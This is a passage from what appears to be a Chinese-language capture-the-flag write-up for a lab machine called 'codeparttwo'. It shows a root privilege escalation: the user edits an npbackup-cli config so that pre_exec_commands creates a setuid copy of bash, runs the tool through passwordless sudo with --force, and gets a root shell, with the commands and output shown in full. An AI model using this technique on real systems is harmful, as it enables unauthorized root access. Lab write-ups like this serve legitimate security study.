marco用户可以无密码root执行npbackup-cli
```
marco@codeparttwo:~$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

帮助可以看到能够指定config文件，指定-b参数运行back，-f强制执行
```
  -c CONFIG_FILE, --config-file CONFIG_FILE
                        Path to alternative configuration file (defaults to current dir/npbackup.conf)

  -b, --backup          Run a backup
  -f, --force           Force running a backup regardless of existing backups age
```
家目录下可以发现conf文件，基于内容做修改
```
marco@codeparttwo:~$ cat npbackup.conf
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri:
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /home/app/app/
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password:
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      stdin_from_command:
      stdin_filename:
      tags: []
      compression: auto
      use_fs_snapshot: true
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files:
      - excludes/generic_excluded_extensions
      - excludes/generic_excludes
      - excludes/windows_excludes
      - excludes/linux_excludes
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 10 MiB
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
      repo_password_command:
      minimum_backup_age: 1440
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
        ntp_server:
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false
identity:
  machine_id: ${HOSTNAME}__blw0
  machine_group:
global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}
```
重点关注`pre_exec_commands: []`等执行外部命令的参数，修改为
`pre_exec_commands: [cp /bin/bash /tmp/rootbash;chmod +s /tmp/rootbash]`
加上强制执行，避免备份时间间隔短取消执行
```
marco@codeparttwo:~$ vim /tmp/npbackup.conf
marco@codeparttwo:~$ cd /tmp/
marco@codeparttwo:/tmp$ sudo npbackup-cli -b -c npbackup.conf --force
2025-12-02 08:46:40,177 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-12-02 08:46:40,199 :: INFO :: Loaded config 058A6D05 in /tmp/npbackup.conf
2025-12-02 08:46:40,208 :: INFO :: Running backup of ['/home/app/app/'] to repo default
2025-12-02 08:46:40,270 :: INFO :: Pre-execution of command cp /bin/bash /tmp/rootbash;chmod +s /tmp/rootbash succeeded with:
None
2025-12-02 08:46:41,719 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excluded_extensions
2025-12-02 08:46:41,720 :: ERROR :: Exclude file 'excludes/generic_excluded_extensions' not found
2025-12-02 08:46:41,720 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excludes
2025-12-02 08:46:41,720 :: ERROR :: Exclude file 'excludes/generic_excludes' not found
2025-12-02 08:46:41,721 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/windows_excludes
2025-12-02 08:46:41,721 :: ERROR :: Exclude file 'excludes/windows_excludes' not found
2025-12-02 08:46:41,721 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/linux_excludes
2025-12-02 08:46:41,721 :: ERROR :: Exclude file 'excludes/linux_excludes' not found
2025-12-02 08:46:41,722 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows
no parent snapshot found, will read all files

Files:          12 new,     0 changed,     0 unmodified
Dirs:            9 new,     0 changed,     0 unmodified
Added to the repository: 50.053 KiB (20.069 KiB stored)

processed 12 files, 48.965 KiB in 0:00
snapshot e4c0088e saved
2025-12-02 08:46:42,889 :: INFO :: Backend finished with success
2025-12-02 08:46:42,892 :: INFO :: Processed 49.0 KiB of data
2025-12-02 08:46:42,892 :: ERROR :: Backup is smaller than configured minmium backup size
2025-12-02 08:46:42,892 :: ERROR :: Operation finished with failure
2025-12-02 08:46:42,893 :: INFO :: Runner took 2.685816 seconds for backup
2025-12-02 08:46:42,894 :: INFO :: Operation finished
2025-12-02 08:46:42,903 :: INFO :: ExecTime = 0:00:02.728008, finished, state is: errors.


marco@codeparttwo:/tmp$ ./rootbash -p
rootbash-5.0# id
uid=1000(marco) gid=1000(marco) euid=0(root) egid=0(root) groups=0(root),1000(marco),1003(backups)
```

